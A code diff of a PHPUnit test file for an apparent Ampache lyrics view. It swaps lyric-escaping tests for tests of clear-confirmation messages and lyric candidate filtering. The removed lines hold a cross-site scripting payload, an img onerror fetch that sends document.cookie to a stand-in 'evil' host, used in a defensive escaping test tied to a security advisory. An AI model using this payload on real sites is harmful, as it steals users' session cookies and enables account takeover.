@@ -26,63 +26,54 @@ declare(strict_types=1);
 namespace Ampache\Gui\Song;
 
 use Ampache\MockeryTestCase;
+use Ampache\Repository\Model\LyricsSourceEnum;
 use Ampache\Repository\Model\Song;
 
 class LyricsViewTest extends MockeryTestCase
 {
-    public function testGetLyricsConvertsNewlinesToBreaks(): void
+    public function testClearKeepsThePlainWarningForLyricsFromTheFile(): void
     {
-        $subject = new LyricsView(
-            'https://music.example',
-            $this->mock(Song::class),
-            ['text' => "Line one\nLine two"]
-        );
+        $song                = $this->mock(Song::class);
+        $song->lyrics_source = LyricsSourceEnum::FILE;
 
-        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
+        $subject = new LyricsView('https://music.example', $song, ['text' => 'Tagged'], true, true);
+
+        $this->assertFalse($subject->isUserSet());
+        $this->assertSame('Clear the stored lyrics?', $subject->getClearConfirmation());
     }
 
-    /**
-     * A hostile ID3 USLT/LYRICS frame (GHSA-jp97-cx77-834v) must never reach the page unescaped.
-     */
-    public function testGetLyricsEscapesHostileMarkup(): void
+    public function testClearWarnsThatUserSetLyricsWillBeLost(): void
     {
-        $payload = '<img src=x onerror=fetch("//evil/"+document.cookie)>';
+        $song                = $this->mock(Song::class);
+        $song->lyrics_source = LyricsSourceEnum::USER;
 
-        $subject = new LyricsView(
-            'https://music.example',
-            $this->mock(Song::class),
-            ['text' => $payload]
-        );
+        $subject = new LyricsView('https://music.example', $song, ['text' => 'Typed'], true, true);
 
-        $result = $subject->getLyrics();
-
-        $this->assertStringNotContainsString('<img', $result);
-        $this->assertStringContainsString('&lt;img', $result);
+        $this->assertTrue($subject->isUserSet());
+        $this->assertSame('These lyrics were set by hand and will be lost. Clear them?', $subject->getClearConfirmation());
     }
 
-    /**
-     * Lyrics fetched by a provider before this fix were pre-formatted with a real <br>; it must still line-break
-     * rather than being shown as literal, escaped tag text now that escaping applies to the whole value.
-     */
-    public function testGetLyricsNormalizesLegacyStoredBreaks(): void
+    public function testGetCandidatesSkipsAnswersWithoutText(): void
     {
         $subject = new LyricsView(
             'https://music.example',
             $this->mock(Song::class),
-            ['text' => 'Line one<br />Line two']
+            [],
+            false,
+            true,
+            [
+                'Lyrist' => ['text' => '', 'url' => 'https://lyrist.example/1'],
+                'LrcLib' => ['text' => "[00:01.00]Hello", 'url' => ''],
+                'ChartLyrics' => ['text' => 'Hello', 'url' => 'https://chart.example/1'],
+            ]
         );
 
-        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
-    }
-
-    public function testGetLyricsReturnsPlaceholderWhenEmpty(): void
-    {
-        $subject = new LyricsView(
-            'https://music.example',
-            $this->mock(Song::class),
-            []
+        $this->assertSame(
+            [
+                ['plugin' => 'LrcLib', 'text' => '[00:01.00]Hello', 'url' => null],
+                ['plugin' => 'ChartLyrics', 'text' => 'Hello', 'url' => 'https://chart.example/1'],
+            ],
+            $subject->getCandidates()
         );
-
-        $this->assertSame('No lyrics found.', $subject->getLyrics());
     }
 }
